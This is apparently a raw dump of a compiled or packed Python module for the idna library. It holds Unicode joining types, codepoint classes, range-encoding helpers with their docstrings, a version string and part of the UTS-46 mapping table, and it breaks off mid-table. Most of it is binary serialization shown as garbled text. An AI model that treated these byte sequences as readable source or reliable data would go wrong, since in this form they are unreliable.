pppppppppppppppppppppppppppppppppplTplDppppppppppppppppppppppppppppppppplTlDlTpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppplClTpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppplDppppppppppppppppppppppppppppppppppppppppppppppppplLlTppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppplDpppplRppplLlRpppplDppplLlDpppplRlDpplRplTplDppplRlDlRlDlRpplDpplRlDplRlDlRplDlRpppplDplLlDpppppppppppppppppppppppppppppppplRlDlTpppppppplDpplRlDpppppppppppppppplTpppppppppplDpplRlDppplRplDppppppppppplTppplDpplRpplDlRplDplRlDpplRplDlRlDlLlTpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppplDppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppplTppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppajoining_typesDaPVALIDaCONTEXTJaCONTEXTOTgZ.g`:g{ggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg
ggggg
g
g
g
g
g
g
ggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg
g
g
g
g
g
g
g
g
g
g
g
g
g
g
g
g
g
g
g
g
g
g
g
g
g
gggggggggggggg
g
g
g
gggggg g!g!g!g"g"g#g%g%g%g&g&g&g&g&g&g&g'g'g'g'g'g'g'g(g(g(g(g(g(g(g(g(g(g)g)g)g)g)g*g*g*g*g*g*g*g*g+g+g+g+g+g+g,g,g,g,g,g,g,g,g-g-g-g-g-g-g.g.g.g.g.g.g.g.g.g.g.g/g/g/g/g/g0g0g0g0g0g1g1g1g1g1g1g1g2g2g2g2g2g2g2g3g3g3g3g3g3g3g4g4g4g5g5g5g5g5g5g6g6g6g6g6g7g7g7g7g7g7g7g8g8g9g9g:g:g:g:g:g:g:g;g;g;g;g;g<g<g<g<g<g<g<g<g=g=g=g=g=g=g=g=g=g=g>g>g>g>g>g>g>g>g>g?g@ gA!gC!gC"gH$gI$gI$gI$gI$gI%gJ%gJ%gJ%gJ%gK%gK%gK%gK&gL&gL&gM&gN'gN'gP,gY-gZ-gZ-g[-g\.g\.g].g].g].g].g^/g^/g_/g_/g_/g`0g`0gb1gb1gd2gd2gd2ge2ge2gf3gf3gg3gh4gh4gi4gi5gj5gj5gj5gj5gl6gm6gm6gn7gp8gq8gq8gs9gs9gt:gt:gt:gu:gu:gu;gw<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gx<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy<gy=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=gz=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{=g{>g|>g|>g|>g}>g}>g}>g}>g}>g}>g}>g}>g}>g}>g~?g~?g?g?g?g?g?g?gBgCgXg±XgʱXgбXgԱXgرXgXgXgXgYgYgYgYgYgYgYgYgYgYgYgYgYgYgYgYg²YgƲYgʲYgβYgҲYgֲYgڲYg޲YgYgYgYgYgYgYgYgYgYgYgYgYgYgYgYgYgYgYgYgYgYgYgYgYg³YgƳYgسYgܳYgYgZgδZgڴZgZg[g[gж[g[g[g[g[g[g[g\g޸\g`g`g`gagagagagagbgcgdgggggggggggggggggggggggƙgʙgΙgҙg֙gڙggggggggggggggggggggƜgʜgΜgҜg֜gڜgޜgggggggggggggggggggggggggƝgʝgΝgҝg֝gڝgޝgggggggggggggggggggƞgʞgΞgҞgޞggggggggggggggggggؠgggggggggggggggggggggggЬggggدgggggggggggggggЀgg΀gހggggхgggڌgʆgggćgЇgАggggggƖgggg֎gggggggg֐ggggggggggggggggggȕggg֖gggɘgggggֺgggμgўggşggǠgggágggggȢgggţgͣgۣgݣggg¤gggggggggggggggŦgɦgΦgѦgئgggg˨gڨggƩgȩgکgggޫggŬgڬggʭggggǮgggggggggĲgڲggسggggȴgggggggڸgggggggggȺgںggggggggggþgھggggggg
ǌgggggggggggƭgggggggƿggg֙gg
g
g
g
g
g
g
g
g
g
g
g
g
g
ggǞggggggggggggƀg̀ggggggggggПgڟggggĤgg
g
g
gggg˦gTg@Tgg
ggg
gaacodepoint_classesuidna\idnadata.pyu<module idna.idnadata>u.idna.intrangesQ(asortedqlalast_writearangesa_encode_rangeluRepresent a list of integers as a sequence of ranges:
    ((start_0, end_0), (start_1, end_1), ...), such that the original
    integers are exactly those x such that start_i <= x < end_i for some i.

    Ranges are encoded as single integers (start << 32 | end), not as tuples.
    l gabisectabisect_lefta_decode_rangeutoo many values to unpack (expected 2)uDetermine if `int_` falls into one of the ranges in `ranges`.u
Given a list of integers, made up of (hopefully) a small number of long runs
of consecutive integers, compute a representation of the form
((start1, end1), (start2, end2) ...). Then answer the question "was x present
in the original list?" in time O(log(# runs)).
a__doc__a__file__a__spec__aoriginahas_locationa__cached__aListaTuplealist_areturnTOintQaintranges_from_listDastartaendareturnOintppwrTOintpaint_aintranges_containuidna\intranges.pyu<module idna.intranges>TwrTastartaendTaint_arangesatuple_aposaleftarightw_Talist_asorted_listarangesalast_writewiacurrent_rangeu.idna.package_dataa__doc__a__file__a__spec__aoriginahas_locationa__cached__u3.7a__version__uidna\package_data.pyu<module idna.package_data>u.idna.uts46databLdTlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tl
w3Tlw3Tlw3Tl
w3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tlw3Tl w3Tl!w3Tl"w3Tl#w3Tl$w3Tl%w3Tl&w3Tl'w3Tl(w3Tl)w3Tl*w3Tl+w3Tl,w3Tl-wVTl.wVTl/w3Tl0wVTl1wVTl2wVTl3wVTl4wVTl5wVTl6wVTl7wVTl8wVTl9wVTl:w3Tl;w3Tl<w3Tl=w3Tl>w3Tl?w3Tl@w3TlAwMwaTlBwMwbTlCwMwcTlDwMwdTlEwMweTlFwMwfTlGwMwgTlHwMwhTlIwMwiTlJwMwjTlKwMwkTlLwMwlTlMwMwmTlNwMwnTlOwMwoTlPwMwpTlQwMwqTlRwMwrTlSwMwsTlTwMwtTlUwMwuTlVwMwvTlWwMwwTlXwMwxTlYwMwyTlZwMwzTl[w3Tl\w3Tl]w3Tl^w3Tl_w3Tl`w3TlawVTlbwVTlcwVLdTldwVTlewVTlfwVTlgwVTlhwVTliwVTljwVTlkwVTllwVTlmwVTlnwVTlowVTlpwVTlqwVTlrwVTlswVTltwVTluwVTlvwVTlwwVTlxwVTlywVTlzwVTl{w3Tl|w3Tl}w3Tl~w3Tlw3TlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlwXTlw3w TlwVTlwVTlwVTlwVTlwVTlwVTlwVTlw3u ̈TlwVTlwMwaTlwVTlwVTlwITlwVTlw3u ̄TlwVTlwVTlwMw2TlwMw3Tlw3u ́TlwMuμTlwVTlwVTlw3u ̧TlwMw1TlwMwoTlwVTlwMu1⁄4TlwMu1⁄2TlwMu3⁄4TlwVTlwMuàTlwMuáTlwMuâTlwMuãTlwMuäTlwMuåTlwMuæTlwMuçLdTlwMuèTlwMuéTlwMuêTlwMuëTlwMuìTlwMuíTlwMuîTlwMuïTlwMuðTlwMuñTlwMuòTlwMuóTlwMuôTlwMuõTlwMuöTlwVTlwMuøTlwMuùTlwMuúTlwMuûTlwMuüTlwMuýTlwMuþTlwDassTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwVTlwMuāTlwVTlwMuăTlwVTlwMuąTlwVTlwMućTlwVTlwMuĉTlwVTlwMuċTlwVTlwMučTlwVTlwMuďTlwVTlwMuđTlwVTlwMuēTlwVTlwMuĕTlwVTlwMuėTlwVTlwMuęTlwVTlwMuěTlwVTlwMuĝTlwVTlwMuğTlwVTlwMuġTlwVTlwMuģTlwVTlwMuĥTlwVTlwMuħTlwVTlwMuĩTlwVTlwMuīTlwVLdTlwMuĭTlwVTlwMuįTlwVTlwMui̇TlwVTlwMaijTlwMuĵTlwVTlwMuķTlwVTlwMuĺTlwVTlwMuļTlwVTlwMuľTlwVTlwMul·TlwMułTlwVTlwMuńTlwVTlwMuņTlwVTlwMuňTlwVTlwMuʼnTlwMuŋTlwVTlwMuōTlwVTlwMuŏTlwVTlwMuőTlwVTlwMuœTlwVTlwMuŕTlwVTlwMuŗTlwVTlwMuřTlwVTlwMuśTlwVTlwMuŝTlwVTlwMuşTlwVTlwMušTlwVTlwMuţTlwVTlwMuťTlwVTlwMuŧTlwVTlwMuũTlwVTlwMuūTlwVTlwMuŭTlwVTlwMuůTlwVTlwMuűTlwVTlwMuųTlwVTlwMuŵTlwVTlwMuŷTlwVTlwMuÿTlwMuźTlwVTlwMużTlwVTlwMužTlwVTlwMwsTlwVTlwMuɓTlwMuƃTlwVTlwMuƅTlwVTlwMuɔTlwMuƈTlwVTlwMuɖTlwMuɗTlwMuƌTlwVTlwMuǝTlwMuəTlwMuɛTlwMuƒTlwVTlwMuɠLdTlwMuɣTlwVTlwMuɩTlwMuɨTlwMuƙTlwVTlwMuɯTlwMuɲTlwVTlwMuɵTlwMuơTlwVTlwMuƣTlwVTlwMuƥTlwVTlwMuʀTlwMuƨTlwVTlwMuʃTlwVTlwMuƭTlwVTlwMuʈTlwMuưTlwVTlwMuʊTlwMuʋTlwMuƴTlwVTlwMuƶTlwVTlwMuʒTlwMuƹTlwVTlwMuƽTlwVTlwMudžTlwMaljTlwManjTlwMuǎTlwVTlwMuǐTlwVTlwMuǒTlwVTlwMuǔTlwVTlwMuǖTlwVTlwMuǘTlwVTlwMuǚTlwVTlwMuǜTlwVTlwMuǟTlwVTlwMuǡTlwVTlwMuǣTlwVTlwMuǥTlwVTlwMuǧTlwVTlwMuǩTlwVTlwMuǫTlwVTlwMuǭTlwVTlwMuǯTlwVTlwMadzTlwMuǵTlwVTlwMuƕTlwMuƿTlwMuǹTlwVTlwMuǻTlwVTlwMuǽTlwVTlwMuǿTlwVTlwMuȁTlwVTlwMuȃTlwVTlwMuȅTlwVTlwMuȇTlwVTlwMuȉTlwVTlwMuȋTlwVTlwMuȍLdTlwVTlwMuȏTlwVTlwMuȑTlwVTlwMuȓTlwVTlwMuȕTlwVTlwMuȗTlwVTlwMușTlwVTlwMuțTlwVTlwMuȝTlwVTlwMuȟTlwVTlwMuƞTlwVTlwMuȣTlwVTlwMuȥTlwVTlwMuȧTlwVTlwMuȩTlwVTlwMuȫTlwVTlwMuȭTlwVTlwMuȯTlwVTlwMuȱTlwVTlwMuȳTlwVTlwMuⱥTlwMuȼTlwVTlwMuƚTlwMuⱦTlwVTlwMuɂTlwVTlwMuƀTlwMuʉTlwMuʌTlwMuɇTlwVTlwMuɉTlwVTlwMuɋTlwVTlwMuɍTlwVTlwMuɏTlwVTlwMwhTlwMuɦTlwMwjTlwMwrTlwMuɹTlwMuɻTlwMuʁTlwMwwTlwMwyTlwVTlw3u ̆Tlw3u ̇Tlw3u ̊Tlw3u ̨Tlw3u ̃Tlw3u ̋TlwVTlwMuɣTlwMwlTlwMwsTlwMwxTlwMuʕTlwVTlwMùTlwMúTlwVTlwMu̓TlwMǘTlwMuιTlwVTlwITlwVTlwMuͱTlwVTlwMuͳTlwVTlwMuʹTlwVTlwMuͷTlwVLdTlwXTlw3u ιTlwVTlw3w;TlwMuϳTlwXTlw3u ́Tlw3u ̈́TlwMuάTlwMu·TlwMuέTlwMuήTlwMuίTlwXTlwMuόTlwXTlwMuύTlwMuώTlwVTlwMuαTlwMuβTlwMuγTlwMuδTlwMuεTlwMuζTlwMuηTlwMuθTlwMuιTlwMuκTlwMuλTlwMuμTlwMuνTlwMuξTlwMuοTlwMuπTlwMuρTlwXTlwMuσTlwMuτTlwMuυTlwMuφTlwMuχTlwMuψTlwMuωTlwMuϊTlwMuϋTlwVTlwDuσTlwVTlwMuϗTlwMuβTlwMuθTlwMuυTlwMuύTlwMuϋTlwMuφTlwMuπTlwVTlwMuϙTlwVTlwMuϛTlwVTlwMuϝTlwVTlwMuϟTlwVTlwMuϡTlwVTlwMuϣTlwVTlwMuϥTlwVTlwMuϧTlwVTlwMuϩTlwVTlwMuϫTlwVTlwMuϭTlwVTlwMuϯTlwVTlwMuκTlwMuρTlwMuσTlwVTlwMuθTlwMuεTlwVTlwMuϸTlwVTlwMuσTlwMuϻTlwVTlwMuͻTlwMuͼTlwMuͽTlwMuѐTlwMuёTlwMuђLdTlwMuѓTlwMuєTlwMuѕTlwMuіTlwMuїTlwMuјTlwMuљTlwMuњTlwMuћTlwMuќTlwMuѝTlwMuўTlwMuџTlwMuаTlwMuбTlwMuвTlwMuгTlwMuдTlwMuеTlwMuжTlwMuзTlwMuиTlwMuйTlwMuкTlwMuлTlwMuмTlwMuнTlwMuоTlwMuпTlwMuрTlwMuсTlwMuтTlwMuуTlwMuфTlwMuхTlwMuцTlwMuчTlwMuшTlwMuщTlwMuъTlwMuыTlwMuьTlwMuэTlwMuюTlwMuяTlwVTlwMuѡTlwVTlwMuѣTlwVTlwMuѥTlwVTlwMuѧTlwVTlwMuѩTlwVTlwMuѫTlwVTlwMuѭTlwVTlwMuѯTlwVTlwMuѱTlwVTlwMuѳTlwVTlwMuѵTlwVTlwMuѷTlwVTlwMuѹTlwVTlwMuѻTlwVTlwMuѽTlwVTlwMuѿTlwVTlwMuҁTlwVTlwMuҋTlwVTlwMuҍTlwVTlwMuҏTlwVTlwMuґTlwVTlwMuғTlwVTlwMuҕTlwVTlwMuҗTlwVTlwMuҙTlwVTlwMuқTlwVTlwMuҝTlwVLdTlwMuҟTlwVTlwMuҡTlwVTlwMuңTlwVTlwMuҥTlwVTlwMuҧTlwVTlwMuҩTlwVTlwMuҫTlwVTlwMuҭTlwVTlwMuүTlwVTlwMuұTlwVTlwMuҳTlwVTlwMuҵTlwVTlwMuҷTlwVTlwMuҹTlwVTlwMuһTlwVTlwMuҽTlwVTlwMuҿTlwVTlwXTlwMuӂTlwVTlwMuӄTlwVTlwMuӆTlwVTlwMuӈTlwVTlwMuӊTlwVTlwMuӌTlwVTlwMuӎTlwVTlwMuӑTlwVTlwMuӓTlwVTlwMuӕTlwVTlwMuӗTlwVTlwMuәTlwVTlwMuӛTlwVTlwMuӝTlwVTlwMuӟTlwVTlwMuӡTlwVTlwMuӣTlwVTlwMuӥTlwVTlwMuӧTlwVTlwMuөTlwVTlwMuӫTlwVTlwMuӭTlwVTlwMuӯTlwVTlwMuӱTlwVTlwMuӳTlwVTlwMuӵTlwVTlwMuӷTlwVTlwMuӹTlwVTlwMuӻTlwVTlwMuӽTlwVTlwMuӿTlwVTl
wMuԁTl
wVTl
wMuԃLdTl
wVTl
wMuԅTl
wVTl
wMuԇTl
wVTl
wMuԉTl
wVTl
wMuԋTl
wVTl
wMuԍTl
wVTl
wMuԏTl
wVTl
wMuԑTl
wVTl
wMuԓTl
wVTl
wMuԕTl
wVTl
wMuԗTl
wVTl
wMuԙTl
wVTl
wMuԛTl
wVTl
wMuԝTl
wVTl
wMuԟTl
wVTl
wMuԡTl
wVTl
wMuԣTl
wVTl
wMuԥTl
wVTl
wMuԧTl
wVTl
wMuԩTl
wVTl
wMuԫTl
wVTl
wMuԭTl
wVTl
wMuԯTl
wVTl
wXTl
wMuաTl
wMuբTl
wMuգTl
wMuդTl
wMuեTl
wMuզTl
wMuէTl
wMuըTl
wMuթTl
wMuժTl
wMuիTl
wMuլTl
wMuխTl
wMuծTl
wMuկTl
wMuհTl
wMuձTl
wMuղTl
wMuճTl
wMuմTl
wMuյTl
wMuնTl
wMuշTl
wMuոTl
wMuչTl
wMuպTl
wMuջTl
wMuռTl
wMuսTl
wMuվTl
wMuտTl
wMuրTl
wMuցTl
wMuւTl
wMuփTl
wMuքTl
wMuօTl
wMuֆTl
wXTl
wVTlwMuեւTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVLdTlwMuاٴTlwMuوٴTlwMuۇٴTlwMuيٴTlwVTl
wXTl
wVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwMuक़TlwMuख़TlwMuग़TlwMuज़TlwMuड़TlwMuढ़TlwMuफ़TlwMuय़TlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwMuড়TlwMuঢ়TlwXTlwMuয়TlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwMuਲ਼TlwXTlwVTlwMuਸ਼TlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwMuਖ਼TlwMuਗ਼TlwMuਜ਼TlwVTlwXLdTlwMuਫ਼TlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwMuଡ଼TlwMuଢ଼TlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVLdTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwMuําTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwMuໍາTlwVLdTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwMuຫນTlwMuຫມTlwVTlwXTlwVTlwMu་TlwVTlwMuགྷTlwVTlwXTlwVTlwMuཌྷTlwVTlwMuདྷTlwVTlwMuབྷTlwVTlwMuཛྷTlwVTlwMuཀྵTlwVTlwXTlwVTlwMuཱིTlwVTlwMuཱུTlwMuྲྀTlwMuྲཱྀTlwMuླྀTlwMuླཱྀTlwVTlwMuཱྀTlwVTlwMuྒྷTlwVTlwXTlwVTlwMuྜྷTlwVTlwMuྡྷTlwVTlwMuྦྷTlwVTlwMuྫྷTlwVTlwMuྐྵTlwVTlwXTlwVTlwXTlwVTlwXTl wVTl!wXTl!wMuⴧTl!wXTl!wMuⴭTl!wXTl!wVTl!wMuნTl!wVTl"wXTl"wVTl$wXTl$wVTl$wXTl$wVTl$wXTl$wVTl$wXTl$wVTl$wXTl$wVTl%wXTl%wVTl%wXTl%wVTl%wXTl%wVTl%wXTl%wVTl%wXTl%wVTl%wXTl%wVTl%wXTl%wVTl%wXTl%wVTl&wXTl&wVLdTl&wXTl&wVTl&wXTl&wVTl&wXTl'wVTl'wXTl'wVTl'wXTl'wMuᏰTl'wMuᏱTl'wMuᏲTl'wMuᏳTl'wMuᏴTl'wMuᏵTl'wXTl(wVTl-wXTl-wVTl-wXTl-wVTl-wXTl.wVTl.wXTl.wVTl.wXTl.wVTl.wXTl.wVTl.wXTl.wVTl.wXTl.wVTl.wXTl/wVTl/wXTl/wVTl/wXTl/wVTl/wXTl/wVTl/wXTl0wVTl0wXTl0wVTl0wITl0wXTl0wITl0wVTl0wXTl0wVTl0wXTl1wVTl1wXTl1wVTl1wXTl2wVTl2wXTl2wVTl2wXTl2wVTl2wXTl2wVTl2wXTl2wVTl2wXTl2wVTl2wXTl3wVTl3wXTl3wVTl3wXTl3wVTl3wXTl3wVTl4wXTl4wVTl4wXTl4wVTl4wXTl4wVTl5wXTl5wVTl5wXTl5wVTl5wXTl5wVTl5wXTl6wVTl6wXTl6wVTl6wXTl7wVTl7wXTl7wVTl8wXTl8wVTl8wXTl8wVTl9wMuвLdTl9wMuдTl9wMuоTl9wMuсTl9wMuтTl9wMuъTl9wMuѣTl9wMuꙋTl9wXTl9wMuაTl9wMuბTl9wMuგTl9wMuდTl9wMuეTl9wMuვTl9wMuზTl9wMuთTl9wMuიTl9wMuკTl9wMuლTl9wMuმTl9wMuნTl9wMuოTl9wMuპTl9wMuჟTl9wMuრTl9wMuსTl9wMuტTl9wMuუTl9wMuფTl9wMuქTl9wMuღTl9wMuყTl9wMuშTl9wMuჩTl9wMuცTl9wMuძTl9wMuწTl9wMuჭTl9wMuხTl9wMuჯTl9wMuჰTl9wMuჱTl9wMuჲTl9wMuჳTl9wMuჴTl9wMuჵTl9wMuჶTl9wMuჷTl9wMuჸTl9wMuჹTl9wMuჺTl9wXTl9wMuჽTl9wMuჾTl9wMuჿTl9wVTl9wXTl9wVTl9wXTl:wVTl:wMwaTl:wMuæTl:wMwbTl:wVTl:wMwdTl:wMweTl:wMuǝTl:wMwgTl:wMwhTl:wMwiTl:wMwjTl:wMwkTl:wMwlTl:wMwmTl:wMwnTl:wVTl:wMwoTl:wMuȣTl:wMwpTl:wMwrTl:wMwtTl:wMwuTl:wMwwTl:wMwaTl:wMuɐTl:wMuɑTl:wMuᴂTl:wMwbTl:wMwdTl:wMweTl:wMuəTl:wMuɛTl:wMuɜTl:wMwgTl:wVTl:wMwkTl:wMwmTl:wMuŋTl:wMwoTl:wMuɔLdTl:wMuᴖTl:wMuᴗTl:wMwpTl:wMwtTl:wMwuTl:wMuᴝTl:wMuɯTl:wMwvTl:wMuᴥTl:wMuβTl:wMuγTl:wMuδTl:wMuφTl:wMuχTl:wMwiTl:wMwrTl:wMwuTl:wMwvTl:wMuβTl:wMuγTl:wMuρTl:wMuφTl:wMuχTl:wVTl:wMuнTl:wVTl;wMuɒTl;wMwcTl;wMuɕTl;wMuðTl;wMuɜTl;wMwfTl;wMuɟTl;wMuɡTl;wMuɥTl;wMuɨTl;wMuɩTl;wMuɪTl;wMuᵻTl;wMuʝTl;wMuɭTl;wMuᶅTl;wMuʟTl;wMuɱTl;wMuɰTl;wMuɲTl;wMuɳTl;wMuɴTl;wMuɵTl;wMuɸTl;wMuʂTl;wMuʃTl;wMuƫTl;wMuʉTl;wMuʊTl;wMuᴜTl;wMuʋTl;wMuʌTl;wMwzTl;wMuʐTl;wMuʑTl;wMuʒTl;wMuθTl;wVTl<wMuḁTl<wVTl<wMuḃTl<wVTl<wMuḅTl<wVTl<wMuḇTl<wVTl<wMuḉTl<wVTl<wMuḋTl<wVTl<wMuḍTl<wVTl<wMuḏTl<wVTl<wMuḑTl<wVTl<wMuḓTl<wVTl<wMuḕTl<wVTl<wMuḗTl<wVTl<wMuḙTl<wVTl<wMuḛTl<wVTl<wMuḝTl<wVTl<wMuḟTl<wVTl<wMuḡTl<wVTl<wMuḣTl<wVLdTl<wMuḥTl<wVTl<wMuḧTl<wVTl<wMuḩTl<wVTl<wMuḫTl<wVTl<wMuḭTl<wVTl<wMuḯTl<wVTl<wMuḱTl<wVTl<wMuḳTl<wVTl<wMuḵTl<wVTl<wMuḷTl<wVTl<wMuḹTl<wVTl<wMuḻTl<wVTl<wMuḽTl<wVTl<wMuḿTl<wVTl<wMuṁTl<wVTl<wMuṃTl<wVTl<wMuṅTl<wVTl<wMuṇTl<wVTl<wMuṉTl<wVTl<wMuṋTl<wVTl<wMuṍTl<wVTl<wMuṏTl<wVTl<wMuṑTl<wVTl<wMuṓTl<wVTl<wMuṕTl<wVTl<wMuṗTl<wVTl<wMuṙTl<wVTl<wMuṛTl<wVTl<wMuṝTl<wVTl<wMuṟTl<wVTl<wMuṡTl<wVTl<wMuṣTl<wVTl<wMuṥTl<wVTl<wMuṧTl<wVTl<wMuṩTl<wVTl<wMuṫTl<wVTl<wMuṭTl<wVTl<wMuṯTl<wVTl<wMuṱTl<wVTl<wMuṳTl<wVTl<wMuṵTl<wVTl<wMuṷTl<wVTl<wMuṹTl<wVTl<wMuṻTl<wVTl<wMuṽTl<wVTl<wMuṿTl<wVTl=wMuẁTl=wVTl=wMuẃTl=wVTl=wMuẅTl=wVTl=wMuẇTl=wVLdTl=wMuẉTl=wVTl=wMuẋTl=wVTl=wMuẍTl=wVTl=wMuẏTl=wVTl=wMuẑTl=wVTl=wMuẓTl=wVTl=wMuẕTl=wVTl=wMuaʾTl=wMuṡTl=wVTl=wMußTl=wVTl=wMuạTl=wVTl=wMuảTl=wVTl=wMuấTl=wVTl=wMuầTl=wVTl=wMuẩTl=wVTl=wMuẫTl=wVTl=wMuậTl=wVTl=wMuắTl=wVTl=wMuằTl=wVTl=wMuẳTl=wVTl=wMuẵTl=wVTl=wMuặTl=wVTl=wMuẹTl=wVTl=wMuẻTl=wVTl=wMuẽTl=wVTl=wMuếTl=wVTl=wMuềTl=wVTl=wMuểTl=wVTl=wMuễTl=wVTl=wMuệTl=wVTl=wMuỉTl=wVTl=wMuịTl=wVTl=wMuọTl=wVTl=wMuỏTl=wVTl=wMuốTl=wVTl=wMuồTl=wVTl=wMuổTl=wVTl=wMuỗTl=wVTl=wMuộTl=wVTl=wMuớTl=wVTl=wMuờTl=wVTl=wMuởTl=wVTl=wMuỡTl=wVTl=wMuợTl=wVTl=wMuụTl=wVTl=wMuủTl=wVTl=wMuứTl=wVTl=wMuừTl=wVTl=wMuửTl=wVTl=wMuữTl=wVTl=wMuựLdTl=wVTl=wMuỳTl=wVTl=wMuỵTl=wVTl=wMuỷTl=wVTl=wMuỹTl=wVTl=wMuỻTl=wVTl=wMuỽTl=wVTl=wMuỿTl=wVTl>wMuἀTl>wMuἁTl>wMuἂTl>wMuἃTl>wMuἄTl>wMuἅTl>wMuἆTl>wMuἇTl>wVTl>wXTl>wMuἐTl>wMuἑTl>wMuἒTl>wMuἓTl>wMuἔTl>wMuἕTl>wXTl>wVTl>wMuἠTl>wMuἡTl>wMuἢTl>wMuἣTl>wMuἤTl>wMuἥTl>wMuἦTl>wMuἧTl>wVTl>wMuἰTl>wMuἱTl>wMuἲTl>wMuἳTl>wMuἴTl>wMuἵTl>wMuἶTl>wMuἷTl>wVTl>wXTl>wMuὀTl>wMuὁTl>wMuὂTl>wMuὃTl>wMuὄTl>wMuὅTl>wXTl>wVTl>wXTl>wMuὑTl>wXTl>wMuὓTl>wXTl>wMuὕTl>wXTl>wMuὗTl>wVTl>wMuὠTl>wMuὡTl>wMuὢTl>wMuὣTl>wMuὤTl>wMuὥTl>wMuὦTl>wMuὧTl>wVTl>wMuάTl>wVTl>wMuέTl>wVTl>wMuήTl>wVTl>wMuίTl>wVTl>wMuόTl>wVTl>wMuύTl>wVTl>wMuώTl>wXTl?wMuἀιTl?wMuἁιTl?wMuἂιTl?wMuἃιTl?wMuἄιTl?wMuἅιTl?wMuἆιTl?wMuἇιLdTl?wMuἀιTl?wMuἁιTl?wMuἂιTl?wMuἃιTl?wMuἄιTl?wMuἅιTl?wMuἆιTl?wMuἇιTl?wMuἠιTl?wMuἡιTl?wMuἢιTl?wMuἣιTl?wMuἤιTl?wMuἥιTl?wMu